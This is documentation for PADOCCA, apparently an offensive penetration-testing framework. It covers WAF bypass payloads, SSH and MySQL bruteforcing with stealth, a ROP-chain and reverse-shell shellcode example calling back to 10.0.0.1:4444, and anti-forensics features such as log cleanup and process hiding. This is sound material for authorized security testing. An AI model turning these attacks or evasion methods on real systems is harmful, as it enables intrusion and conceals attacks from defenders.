# PADOCCA API Documentation

## Table of Contents
1. [Overview](#overview)
2. [Configuration](#configuration)
3. [Shared Packages](#shared-packages)
4. [Core Components](#core-components)
5. [Tool Usage](#tool-usage)
6. [Advanced Features](#advanced-features)

---

## Overview

PADOCCA v1.4a is a modular, high-performance penetration testing framework designed for professional security assessments. The framework provides a unified API across multiple languages (Rust, Go, Python) with shared configuration and components.

### Architecture

```
┌─────────────────────────────────────────────────────┐
│                    CLI Interface                     │
│                   (padocca.sh)                      │
└──────────────────┬──────────────────────────────────┘
                   │
        ┌──────────┴──────────┬──────────────┐
        │                     │              │
   ┌────▼─────┐    ┌─────────▼──────┐  ┌───▼────┐
   │  Core    │    │    Tools       │  │ Exploit│
   │  (Rust)  │    │    (Go)        │  │ (Rust) │
   └──────────┘    └────────────────┘  └────────┘
        │                     │              │
        └──────────┬──────────┴──────────────┘
                   │
           ┌───────▼────────┐
           │ Shared Packages│
           │  - Config      │
           │  - WAF         │
           │  - Protocols   │
           └────────────────┘
```

---

## Configuration

### Loading Configuration

```go
import "github.com/padocca/tools/pkg/config"

// Load configuration
cfg, err := config.Load("config.yaml")
if err != nil {
    // Falls back to default config
    cfg = config.Get()
}

// Access settings
timeout := cfg.Network.Connection.GetTimeout()
userAgent := cfg.GetUserAgent()
```

### Environment Variables

Override any configuration setting using environment variables:

```bash
# Override network timeout
export PADOCCA_NETWORK_CONNECTION_TIMEOUT=60

# Override SSL verification
export PADOCCA_NETWORK_SSL_VERIFY=false

# Set API keys
export PADOCCA_OSINT_SHODAN_API_KEY="your-key"
```

### Profiles

Apply pre-configured profiles for different scenarios:

```go
// Apply stealth profile
err := config.ApplyProfile(cfg, "stealth")

// Apply aggressive profile
err := config.ApplyProfile(cfg, "aggressive")

// Apply compliance profile
err := config.ApplyProfile(cfg, "compliance")
```

---

## Shared Packages

### WAF Detection (`pkg/waf`)

Advanced WAF/IDS/IPS detection and bypass capabilities.

#### Usage

```go
import "github.com/padocca/tools/pkg/waf"

// Create detector
detector := waf.NewDetector()

// Configure SSL (optional)
detector.SetInsecureSSL(false) // Secure by default

// Detect WAF
result, err := detector.Detect("https://target.com")
if err != nil {
    log.Fatal(err)
}

if result.Detected {
    fmt.Printf("WAF Detected: %s (Confidence: %.2f%%)\n", 
        result.WAFType, result.Confidence*100)
    
    // Get bypass techniques
    for _, bypass := range result.BypassMethods {
        fmt.Printf("Bypass: %s - %s\n", bypass.Name, bypass.Description)
    }
}

// Generate bypass payloads
payloads := detector.GetBypassPayload("Cloudflare", "sql")
```

#### Methods

- `Detect(url string)` - Comprehensive WAF detection
- `AnalyzeTarget(url string)` - Full target analysis
- `GetBypassPayload(wafType, attackType string)` - Generate bypass payloads
- `SetInsecureSSL(bool)` - Configure SSL verification

### Protocol Handlers (`pkg/protocols`)

#### MySQL Protocol

```go
import "github.com/padocca/tools/pkg/protocols"

// Create MySQL bruteforcer
mysql := protocols.NewMySQLBruteforcer("192.168.1.100", 3306, 10*time.Second)

// Try authentication
success, err := mysql.TryAuth("root", "password123")

// Get banner
banner, err := mysql.GetBanner()

// Check vulnerabilities
vulns := mysql.CheckVulnerabilities()
for _, vuln := range vulns {
    fmt.Println("Vulnerability:", vuln)
}
```

---

## Core Components

### Port Scanner (Rust)

High-performance port scanning with multiple techniques.

```bash
# SYN scan
padocca-core scan --target 192.168.1.1 --technique syn --ports 1-65535

# UDP scan
padocca-core scan --target 192.168.1.1 --technique udp --ports 53,161,500

# Service detection
padocca-core scan --target 192.168.1.1 --service-detection
```

### Web Crawler (Go)

Advanced web crawling with JavaScript rendering.

```bash
# Basic crawl
crawler --url https://example.com --depth 3

# With JS rendering
crawler --url https://example.com --js --extract-all

# Output to JSON
crawler --url https://example.com --output results.json
```

### DNS Enumeration (Go)

Comprehensive DNS reconnaissance.

```bash
# Full enumeration
dnsenum --domain example.com --zone --brute --reverse

# Custom wordlist
dnsenum --domain example.com --wordlist custom.txt

# Custom resolvers
dnsenum --domain example.com --resolvers resolvers.txt
```

### Bruteforce (Go)

Multi-protocol credential attacks with intelligent mode.

```bash
# Basic bruteforce
bruteforce --target site.com --protocol ssh

# Intelligent mode with stealth
bruteforce --target site.com --intelligent --stealth --waf-bypass

# Custom wordlists
bruteforce --target site.com --userlist users.txt --passlist pass.txt
```

---

## Tool Usage

### Command Line Interface

All tools follow a consistent command structure:

```bash
padocca [global-options] <command> [command-options]
```

#### Global Options

- `--config PATH` - Custom config file
- `--profile NAME` - Apply profile (stealth/aggressive/compliance)
- `--output FORMAT` - Output format (text/json/xml)
- `--verbose` - Verbose output
- `--quiet` - Suppress non-critical output

### Examples

#### Complete Security Assessment

```bash
# Full scan with all modules
padocca --profile stealth --scan example.com

# Specific modules
padocca --dns example.com --ports --crawl https://example.com
```

#### Targeted Attacks

```bash
# XSS/SQLi scanning
padocca --xss-sqli https://example.com/login

# OSINT gathering
padocca --osint example.com

# Intelligent bruteforce
padocca --bruteforce https://example.com/admin --intelligent
```

---

## Advanced Features

### Stealth Mode

Stealth mode implements multiple evasion techniques:

1. **User Agent Rotation** - Randomizes user agents
2. **Request Timing** - Varies request delays
3. **Session Management** - Maintains realistic sessions
4. **Cookie Handling** - Proper cookie management
5. **Header Spoofing** - Mimics legitimate browsers

#### Enabling Stealth

```go
cfg := config.Get()
cfg.Bruteforce.Stealth.Enabled = true
cfg.Bruteforce.Stealth.Level = 5 // Max stealth
```

### WAF Bypass Techniques

The framework includes advanced WAF bypass methods:

#### SQL Injection Bypasses
- Unicode encoding
- Comment injection
- Case variation
- HTTP Parameter Pollution (HPP)
- Time-based evasion

#### XSS Bypasses
- DOM-based payloads
- Event handler variations
- Encoding techniques
- Polyglot payloads

### Intelligent Bruteforce

The intelligent bruteforce mode includes:

1. **Technology Fingerprinting** - Identifies target technology
2. **WAF Detection** - Detects and bypasses WAF
3. **Default Credentials** - Checks known defaults
4. **Credential Generation** - Creates likely passwords
5. **Adaptive Timing** - Adjusts based on responses

### Custom Exploit Development

```rust
// Using the exploit framework
use exploit_framework::{RopChain, Shellcode, Bypass};

// Generate ROP chain
let chain = RopChain::new()
    .add_gadget(0xdeadbeef, "pop rdi; ret")
    .add_gadget(0xcafebabe, "system")
    .build();

// Generate shellcode
let shellcode = Shellcode::reverse_shell("10.0.0.1", 4444)
    .encode(Encoding::Xor)
    .avoid_badchars(&[0x00, 0x0a, 0x0d]);
```

### API Integration

```python
from padocca import API

# Initialize API client
api = API(config_file="config.yaml")

# Perform scan
results = api.scan(
    target="192.168.1.0/24",
    scan_type="comprehensive",
    profile="stealth"
)

# Get results
for host in results.hosts:
    print(f"Host: {host.ip}")
    for port in host.open_ports:
        print(f"  Port {port.number}: {port.service}")
```

### Reporting

Generate professional reports in multiple formats:

```bash
# Generate HTML report
padocca --report html --output report.html

# Generate PDF report
padocca --report pdf --output report.pdf

# Generate JSON for automation
padocca --report json --output results.json
```

### Performance Optimization

The framework is optimized for maximum performance:

1. **Parallel Processing** - Uses all CPU cores
2. **Async I/O** - Non-blocking operations
3. **Memory Pool** - Efficient memory management
4. **Connection Pooling** - Reuses connections
5. **Cache** - Results caching

#### Performance Tuning

```yaml
# config.yaml
global:
  performance:
    max_workers: 100     # Increase workers
    max_memory: 4096     # Allocate more memory
    cpu_limit: 100       # Use all CPU

scanner:
  port_scan:
    threads: 5000        # Aggressive scanning
    timeout: 500         # Fast timeout

network:
  rate_limit:
    enabled: false       # Disable rate limiting
```

### Security Features

#### Encryption

All sensitive data is encrypted using:
- **ChaCha20-Poly1305** - Default encryption
- **AES-256-GCM** - Alternative option
- **Argon2id** - Key derivation

#### Audit Logging

Complete audit trail of all operations:

```json
{
  "timestamp": "2024-09-03T16:00:00Z",
  "user": "security-team",
  "action": "bruteforce",
  "target": "192.168.1.100",
  "result": "success",
  "credentials": "[REDACTED]"
}
```

#### Anti-Forensics

Optional anti-forensics features:
- Secure memory wiping
- Log cleanup
- Process hiding
- Network trace removal

---

## Best Practices

### Ethical Usage

1. **Authorization** - Always obtain written authorization
2. **Scope** - Stay within defined scope
3. **Documentation** - Document all findings
4. **Disclosure** - Follow responsible disclosure

### Performance

1. **Start Slow** - Begin with stealth mode
2. **Monitor Resources** - Watch CPU/memory usage
3. **Use Profiles** - Apply appropriate profiles
4. **Cache Results** - Enable caching for repeated scans

### Security

1. **SSL Verification** - Keep enabled in production
2. **API Keys** - Use environment variables
3. **Audit Logs** - Enable for compliance
4. **Encryption** - Encrypt sensitive reports

---

## Troubleshooting

### Common Issues

#### Build Errors

```bash
# Clean and rebuild
./scripts/clean-build.sh

# Update dependencies
./scripts/update-dependencies.sh
```

#### Configuration Issues

```bash
# Validate config
padocca --validate-config

# Use default config
padocca --config config.template.yaml
```

#### Performance Issues

```bash
# Reduce workers
export PADOCCA_GLOBAL_PERFORMANCE_MAX_WORKERS=10

# Enable rate limiting
export PADOCCA_NETWORK_RATE_LIMIT_ENABLED=true
```

---

## Support

For issues, questions, or contributions:

- **GitHub**: https://github.com/padocca/padocca
- **Documentation**: https://docs.padocca.io
- **Security**: security@padocca.io

---

*PADOCCA v1.4a - Elite Pentesting Framework*
*Copyright © 2024 PADOCCA Team*
